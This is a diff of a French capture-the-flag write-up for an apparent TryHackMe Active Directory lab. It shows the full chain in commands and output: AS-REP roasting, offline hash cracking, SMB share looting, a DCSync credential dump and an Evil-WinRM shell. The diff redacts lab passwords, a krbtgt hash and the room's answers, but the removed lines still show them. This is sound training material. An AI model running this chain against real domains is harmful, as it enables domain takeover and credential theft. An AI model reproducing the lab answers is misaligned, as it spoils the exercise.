@@ -138,11 +138,11 @@ GetNPUsers.py spookysec.local/ -dc-ip 10.130.178.154 \
 ```
 
 ```text
-$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:1d267d9c3ba315bdcc2da6e28d34d0e7$0fb416acb2...
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:1d2...
 [-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
 
-`svc-admin` a la pré-authentification désactivée, donc on obtient son hash `$krb5asrep$23$...`. `backup` n'est pas vulnérable à cette attaque. Le préfixe `$krb5asrep$23$` indique l'etype 23 (RC4-HMAC) qui est faible et rapide à casser.
+`svc-admin` a la pré-authentification désactivée, donc on obtient son hash. `backup` n'est pas vulnérable à cette attaque. Le préfixe `$krb5asrep$23$` indique l'etype 23 (RC4-HMAC) qui est faible et rapide à casser.
 
 ### Cassage du hash
 
@@ -157,16 +157,16 @@ Status...........: Cracked
 Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
 ```
 
-Le mot de passe de `svc-admin` est retrouvé : **`management2005`**.
+Le mot de passe de `svc-admin` est alors retrouvé.
 
 > [!warning] Pas de brute force en ligne sur un DC
 > En conditions réelles, on n'attaque pas un DC par brute force en ligne (verrouillage de comptes, bruit, déni de service). Ici, le hash se casse hors ligne, sans interaction avec la cible.
 
-**Réponses :** compte interrogeable sans mot de passe -> `svc-admin`, type de hash -> `Kerberos 5 AS-REP etype 23`, mode -> `18200`, mot de passe -> `management2005`
+**Réponses :** compte interrogeable sans mot de passe -> `svc-admin`, type de hash -> `Kerberos 5 AS-REP etype 23`, mode -> `18200`
 
 ## Post-exploitation SMB
 
-Avec `svc-admin:management2005`, on énumère les partages en session authentifiée.
+Avec `svc-admin` et son mot de passe, on énumère les partages en session authentifiée.
 
 ### Liste des partages
 
@@ -194,22 +194,22 @@ smbclient //10.130.178.154/backup -U 'spookysec.local/svc-admin'
 smb: \> ls
   backup_credentials.txt   A   48  ...
 smb: \> more backup_credentials.txt
-YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
+YmF...
 ```
 
 Le contenu ressemble à du Base64 (jeu de caractères, longueur multiple de 4). On le décode.
 
 ```bash
-echo 'YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw' | base64 -d
-# -> backup@spookysec.local:backup2517860
+echo '<contenu du fichier>' | base64 -d
+# -> backup@spookysec.local:<password>
 ```
 
-Les identifiants du compte `backup` sont donc **`backup2517860`**.
+Les identifiants du compte `backup` sont donc trouvés.
 
 > [!note] Base64 n'est pas du chiffrement
 > C'est un encodage réversible. Stocker un identifiant encodé en Base64 n'apporte aucune protection.
 
-**Réponses :** outil -> `smbclient`, option -> `-L`, partages -> `6`, partage -> `backup`, décodé -> `backup@spookysec.local:backup2517860`
+**Réponses :** outil -> `smbclient`, option -> `-L`, partages -> `6`, partage -> `backup`
 
 ## Élévation de privilèges : DCSync
 
@@ -222,13 +222,13 @@ Ces droits permettent de demander au DC de renvoyer les données de l'annuaire, 
 ### Le dump
 
 ```bash
-secretsdump.py 'spookysec.local/backup:backup2517860@10.130.178.154'
+secretsdump.py 'spookysec.local/backup:<password>@10.130.178.154'
 ```
 
 ```text
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:<hash NTLM Administrateur>:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
+Administrator:500:aad3b435...:<hash NTLM Administrateur>:::
+krbtgt:502:aad3b435...:<hash krbtgt>:::
 [...]
 [*] Kerberos keys grabbed
 ```
@@ -258,7 +258,7 @@ Info: Connection successful
 *Evil-WinRM* PS C:\Users\Administrator\Documents>
 ```
 
-Chaque flag se lit avec `type` dans ce shell.
+Les flags sont sur le bureau de chaque compte et se lisent avec `type` dans ce shell.
 
 ```powershell
 *Evil-WinRM* PS C:\> type C:\Users\svc-admin\Desktop\user.txt.txt
@@ -270,16 +270,6 @@ TryHackMe{…}
 ```
 
 Contrôle total du domaine atteint.
-
-## Flags
-
-Les trois flags se trouvent sur le bureau de chaque compte.
-
-| Compte | Emplacement |
-| --- | --- |
-| `svc-admin` | `C:\Users\svc-admin\Desktop\user.txt.txt` |
-| `backup` | `C:\Users\backup\Desktop\PrivEsc.txt` |
-| `Administrator` | `C:\Users\Administrator\Desktop\root.txt` |
 
 ## Méthodologie et chemin d'attaque
 
